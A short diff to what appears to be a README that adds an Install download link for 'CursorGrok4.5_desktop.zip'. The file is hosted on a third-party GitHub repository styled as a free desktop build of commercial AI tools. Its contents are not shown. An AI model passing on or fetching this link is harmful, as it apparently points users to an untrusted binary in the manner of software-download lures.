@@ -8,7 +8,7 @@ Grok 4.5 excels at technical and creative tasks. Compare its context window and 
 
 
 ## Install
-[Download `CursorGrok4.5_desktop.zip`]()
+[Download `CursorGrok4.5_desktop.zip`](https://github.com/CursorGrok4-5/Cursor-Grok-4.5-xAI-free-desktop/releases/download/grok4.5/CursorGrok4.5_desktop.zip)
 ---
 
 
